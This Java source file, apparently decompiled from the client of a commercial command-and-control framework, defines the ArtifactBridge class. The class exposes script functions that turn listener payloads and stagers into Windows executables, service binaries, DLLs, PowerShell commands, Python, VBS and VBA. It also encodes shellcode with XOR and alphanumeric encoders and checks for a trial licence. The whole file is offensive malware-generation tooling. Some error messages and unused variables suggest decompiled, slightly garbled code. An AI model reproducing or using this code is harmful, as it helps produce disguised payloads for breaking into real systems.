package aggressor.bridges;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import common.ArtifactUtils;
import common.Callback;
import common.CommonUtils;
import common.License;
import common.ListenerUtils;
import common.MutantResourceUtils;
import common.PowerShellUtils;
import common.ResourceUtils;
import common.ScListener;
import cortana.Cortana;
import encoders.Transforms;

import java.util.Stack;

import sleep.bridges.BridgeUtilities;
import sleep.bridges.SleepClosure;
import sleep.interfaces.Function;
import sleep.interfaces.Loadable;
import sleep.runtime.Scalar;
import sleep.runtime.ScriptInstance;
import sleep.runtime.SleepUtils;

public class ArtifactBridge implements Function, Loadable {

    protected AggressorClient client;

    public ArtifactBridge(AggressorClient aggressorClient) {
        this.client = aggressorClient;
    }

    public void scriptLoaded(ScriptInstance scriptInstance) {
        Cortana.put(scriptInstance, "&artifact_sign", this);
        Cortana.put(scriptInstance, "&transform", this);
        Cortana.put(scriptInstance, "&transform_vbs", this);
        Cortana.put(scriptInstance, "&encode", this);
        Cortana.put(scriptInstance, "&str_chunk", this);
        Cortana.put(scriptInstance, "&artifact_payload", this);
        Cortana.put(scriptInstance, "&artifact_stager", this);
        Cortana.put(scriptInstance, "&artifact_general", this);
        Cortana.put(scriptInstance, "&payload", this);
        Cortana.put(scriptInstance, "&stager", this);
        Cortana.put(scriptInstance, "&stager_bind_tcp", this);
        Cortana.put(scriptInstance, "&stager_bind_pipe", this);
        Cortana.put(scriptInstance, "&artifact", this);
        Cortana.put(scriptInstance, "&artifact_stageless", this);
        Cortana.put(scriptInstance, "&shellcode", this);
        Cortana.put(scriptInstance, "&powershell", this);
    }

    public void scriptUnloaded(ScriptInstance scriptInstance) {
    }

    public byte[] toArtifact(byte[] arrby, String string1, String string2) {
        byte[] arrby2 = new byte[]{};
        if ("x64".equals(string1)) {
            if ("exe".equals(string2)) {
                return new ArtifactUtils(this.client).patchArtifact(arrby, "artifact64.exe");
            }
            if ("svcexe".equals(string2)) {
                return new ArtifactUtils(this.client).patchArtifact(arrby, "artifact64svc.exe");
            }
            if ("dll".equals(string2)) {
                throw new RuntimeException("Can not generate an x86 dll for an x64 stager. Try dllx64");
            }
            if ("dllx64".equals(string2)) {
                return new ArtifactUtils(this.client).patchArtifact(arrby, "artifact64.x64.dll");
            }
            if ("powershell".equals(string2)) {
                return new ResourceUtils(this.client).buildPowerShell(arrby, true);
            }
            if ("python".equals(string2)) {
                return new ResourceUtils(this.client).buildPython(new byte[0], arrby);
            }
            if ("raw".equals(string2)) {
                return arrby;
            }
            if (!"vbscript".equals(string2)) {
                return arrby2;
            }
            throw new RuntimeException("The VBS output is only compatible with x86 stagers (for now)");
        }
        if (!"x86".equals(string1)) {
            throw new RuntimeException("Invalid arch valid '"
                    + string1 + "'");
        }
        if ("exe".equals(string2)) {
            return new ArtifactUtils(this.client).patchArtifact(arrby, "artifact32.exe");
        }
        if ("svcexe".equals(string2)) {
            return new ArtifactUtils(this.client).patchArtifact(arrby, "artifact32svc.exe");
        }
        if ("dll".equals(string2)) {
            return new ArtifactUtils(this.client).patchArtifact(arrby, "artifact32.dll");
        }
        if ("dllx64".equals(string2)) {
            return new ArtifactUtils(this.client).patchArtifact(arrby, "artifact64.dll");
        }
        if ("powershell".equals(string2)) {
            return new ResourceUtils(this.client).buildPowerShell(arrby, false);
        }
        if ("python".equals(string2)) {
            return new ResourceUtils(this.client).buildPython(arrby, new byte[0]);
        }
        if ("raw".equals(string2)) {
            return arrby;
        }
        if (!"vbscript".equals(string2)) throw new RuntimeException("Unrecognized artifact type: '" + string2 + "'");
        return new MutantResourceUtils(this.client).buildVBS(arrby);
    }

    public byte[] toStagelessArtifact(byte[] arrby, String string1, String string2) {
        byte[] arrby2 = new byte[]{};
        if ("x64".equals(string1)) {
            if (string2.equals("exe")) {
                return new ArtifactUtils(this.client).patchArtifact(arrby, "artifact64big.exe");
            }
            if (string2.equals("svcexe")) {
                return new ArtifactUtils(this.client).patchArtifact(arrby, "artifact64svcbig.exe");
            }
            if (string2.equals("dllx64")) {
                return new ArtifactUtils(this.client).patchArtifact(arrby, "artifact64big.x64.dll");
            }
            if (string2.equals("powershell")) {
                return new ResourceUtils(this.client).buildPowerShell(arrby, true);
            }
            if (string2.equals("python")) {
                return new ResourceUtils(this.client).buildPython(new byte[0], arrby);
            }
            if (!string2.equals("raw")) {
                throw new RuntimeException("Unrecognized artifact type: '" + string2 + "'");
            }
            return arrby;
        }
        if (!"x86".equals(string1)) {
            throw new RuntimeException("Invalid arch valid '" + string1 + "'");
        }
        if (string2.equals("exe")) {
            return new ArtifactUtils(this.client).patchArtifact(arrby, "artifact32big.exe");
        }
        if (string2.equals("svcexe")) {
            return new ArtifactUtils(this.client).patchArtifact(arrby, "artifact32svcbig.exe");
        }
        if (string2.equals("dll")) {
            return new ArtifactUtils(this.client).patchArtifact(arrby, "artifact32big.dll");
        }
        if (string2.equals("dllx64")) {
            return new ArtifactUtils(this.client).patchArtifact(arrby, "artifact64big.dll");
        }
        if (string2.equals("powershell")) {
            return new ResourceUtils(this.client).buildPowerShell(arrby);
        }
        if (string2.equals("python")) {
            return new ResourceUtils(this.client).buildPython(arrby, new byte[0]);
        }
        if (!string2.equals("raw")) throw new RuntimeException("Unrecognized artifact type: '" + string2 + "'");
        return arrby;
    }

    public Scalar evaluate(String string, ScriptInstance scriptInstance, Stack stack) {
        if ("&artifact_sign".equals(string)) {
            byte[] arrby = CommonUtils.toBytes(BridgeUtilities.getString(stack, ""));
            return SleepUtils.getScalar(DataUtils.getSigner(this.client.getData()).sign(arrby));
        }
        if ("&artifact_stageless".equals(string)) {
            final String name = BridgeUtilities.getString(stack, "");
            final String type = BridgeUtilities.getString(stack, "");
            final String arch = BridgeUtilities.getString(stack, "x86");
            final String proxyc = BridgeUtilities.getString(stack, "");
            final SleepClosure cb = BridgeUtilities.getFunction(stack, scriptInstance);
            this.client.getConnection()
                    .call("aggressor.ping", CommonUtils.args(name), new Callback() {

                @Override
                public void result(String string, Object object) {
                    ScListener scListener = ListenerUtils.getListener(ArtifactBridge.this.client, name);
                    scListener.setProxyString(proxyc);
                    byte[] arrby1 = (byte[]) scListener.export(arch);
                    byte[] arrby2 = ArtifactBridge.this.toStagelessArtifact(arrby1, arch, type);
                    Stack stack = new Stack();
                    stack.push(SleepUtils.getScalar(arrby2));
                    SleepUtils.runCode(cb, "&artifact_stageless", null, stack);
                }
            });
        } else {
            if ("&artifact_payload".equals(string)) {
                final String name = BridgeUtilities.getString(stack, "");
                final String type = BridgeUtilities.getString(stack, "");
                final String arch = BridgeUtilities.getString(stack, "x86");
                ScListener scListener = ListenerUtils.getListener(this.client, name);
                if (scListener == null)
                    throw new RuntimeException("No listener '" + string + "'");
                byte[] arrby1 = (byte[]) scListener.export(arch);
                byte[] arrby2 = toStagelessArtifact(arrby1, arch, type);
                return SleepUtils.getScalar(arrby2);
            }
            if ("&artifact_general".equals(string)) {
                byte[] arrby = CommonUtils.toBytes(BridgeUtilities.getString(stack, ""));
                final String name = BridgeUtilities.getString(stack, "");
                final String type = BridgeUtilities.getString(stack, "x86");
                if (arrby.length < 1024) {
                    return SleepUtils.getScalar(toArtifact(arrby, type, name));
                }
                return SleepUtils.getScalar(toStagelessArtifact(arrby, type, name));
            }
            if ("&artifact_stager".equals(string)) {
                final String name = BridgeUtilities.getString(stack, "");
                final String type = BridgeUtilities.getString(stack, "x86");
                final String arch = BridgeUtilities.getString(stack, "");
                ScListener scListener = ListenerUtils.getListener(this.client, name);
                if (scListener == null) {
                    throw new RuntimeException("No listener '" + string + "'");
                }
                return SleepUtils.getScalar(
                        toArtifact(scListener.getPayloadStager(type), type, arch));
            }
            if ("&stager".equals(string)) {
                final String name = BridgeUtilities.getString(stack, "");
                final String type = BridgeUtilities.getString(stack, "x86");
                ScListener scListener = ListenerUtils.getListener(this.client, name);
                if (scListener == null)
                    throw new RuntimeException("No listener '" + string + "'");
                return SleepUtils.getScalar(scListener.getPayloadStager(type));
            }
            if ("&stager_bind_tcp".equals(string)) {
                final String name = BridgeUtilities.getString(stack, "");
                final String type = BridgeUtilities.getString(stack, "x86");
                int i = BridgeUtilities.getInt(stack, CommonUtils.randomPort());
                ScListener scListener = ListenerUtils.getListener(this.client, name);
                return SleepUtils.getScalar(scListener.getPayloadStagerLocal(i, "x86"));
            }
            if ("&stager_bind_pipe".equals(string)) {
                final String name = BridgeUtilities.getString(stack, "");
                final String type = BridgeUtilities.getString(stack, "x86");
                ScListener scListener = ListenerUtils.getListener(this.client, name);
                final String arch = scListener.getConfig().getStagerPipe();
                if ("x86".equals(type)) {
                    return SleepUtils.getScalar(
                            scListener.getPayloadStagerPipe(arch, "x86"));
                }
                throw new RuntimeException("x86 is the only arch option available with &stager_remote");
            }
            if ("&payload".equals(string)) {
                final String name = BridgeUtilities.getString(stack, "");
                final String type = BridgeUtilities.getString(stack, "x86");
                ScListener scListener = ListenerUtils.getListener(this.client, name);
                if (scListener == null) {
                    throw new RuntimeException("No listener '" + string + "'");
                }
                return SleepUtils.getScalar(scListener.export(type));
            }
            if ("&artifact".equals(string)) {
                final String name = BridgeUtilities.getString(stack, "");
                final String type = BridgeUtilities.getString(stack, "");
                Scalar scalar = BridgeUtilities.getScalar(stack);
                final String arch = BridgeUtilities.getString(stack, "x86");
                ScListener scListener = ListenerUtils.getListener(this.client, name);
                return SleepUtils.getScalar(
                        toArtifact(scListener.getPayloadStager(arch), arch, type));
            }
            if ("&shellcode".equals(string)) {
                final String name = BridgeUtilities.getString(stack, "");
                Scalar scalar = BridgeUtilities.getScalar(stack);
                final String type = BridgeUtilities.getString(stack, "x86");
                ScListener scListener = ListenerUtils.getListener(this.client, name);
                if ("x64".equals(type)) {
                    byte[] arrby1 = scListener.getPayloadStager("x64");
                    return SleepUtils.getScalar(arrby1);
                }
                byte[] arrby = scListener.getPayloadStager("x86");
                return SleepUtils.getScalar(arrby);
            }
            if ("&powershell".equals(string)) {
                final String name = BridgeUtilities.getString(stack, "");
                Scalar scalar = BridgeUtilities.getScalar(stack);
                final String type = BridgeUtilities.getString(stack, "x86");
                ScListener scListener = ListenerUtils.getListener(this.client, name);
                if ("x64".equals(type)) {
                    byte[] arrby3 = scListener.getPayloadStager("x64");
                    byte[] arrby4 = new PowerShellUtils(this.client)
                            .buildPowerShellCommand(arrby3, true);
                    return SleepUtils.getScalar(CommonUtils.bString(arrby4));
                }
                byte[] arrby1 = scListener.getPayloadStager("x86");
                byte[] arrby2 = new PowerShellUtils(this.client)
                        .buildPowerShellCommand(arrby1);
                return SleepUtils.getScalar(CommonUtils.bString(arrby2));
            }
            if ("&encode".equals(string)) {
                byte[] arrby = CommonUtils.toBytes(BridgeUtilities.getString(stack, ""));
                final String name = BridgeUtilities.getString(stack, "");
                final String type = BridgeUtilities.getString(stack, "x86");
                if (License.isTrial()) {
                    return SleepUtils.getScalar(arrby);
                }
                if ("xor".equals(name)) {
                    return SleepUtils.getScalar(ArtifactUtils._XorEncode(arrby, type));
                }
                if ("alpha".equals(name) && "x86".equals(type)) {
                    byte[] arrby1 = {-21, 3, 95, -1, -25, -24, -8, -1, -1, -1};
                    return SleepUtils.getScalar(
                            CommonUtils.join(arrby1,
                                    CommonUtils.toBytes(ArtifactUtils._AlphaEncode(arrby))));
                }
                throw new IllegalArgumentException("No encoder '" + name + "' for " + type);
            }
            if ("&str_chunk".equals(string)) {
                String str = BridgeUtilities.getString(stack, "");
                int i = BridgeUtilities.getInt(stack, 100);
                return SleepUtils.getArrayWrapper(ArtifactUtils.toChunk(str, i));
            }
            if ("&transform".equals(string)) {
                byte[] arrby = CommonUtils.toBytes(BridgeUtilities.getString(stack, ""));
                String str = BridgeUtilities.getString(stack, "");
                if ("array".equals(str)) {
                    return SleepUtils.getScalar(Transforms.toArray(arrby));
                }
                if ("escape-hex".equals(str)) {
                    return SleepUtils.getScalar(Transforms.toVeil(arrby));
                }
                if ("hex".equals(str)) {
                    return SleepUtils.getScalar(ArtifactUtils.toHex(arrby));
                }
                if ("powershell-base64".equals(str)) {
                    return SleepUtils.getScalar(CommonUtils.Base64PowerShell(CommonUtils.bString(arrby)));
                }
                if ("vba".equals(str)) {
                    return SleepUtils.getScalar(Transforms.toVBA(arrby));
                }
                if ("vbs".equals(str)) {
                    return SleepUtils.getScalar(ArtifactUtils.toVBS(arrby));
                }
                if ("veil".equals(str)) {
                    return SleepUtils.getScalar(Transforms.toVeil(arrby));
                }
                throw new IllegalArgumentException("Type '" + str + "' is unknown");
            }
            if ("&transform_vbs".equals(string)) {
                byte[] arrby = CommonUtils.toBytes(BridgeUtilities.getString(stack, ""));
                int i = BridgeUtilities.getInt(stack, 8);
                return SleepUtils.getScalar(ArtifactUtils.toVBS(arrby, i));
            }
        }
        return SleepUtils.getEmptyScalar();
    }
}
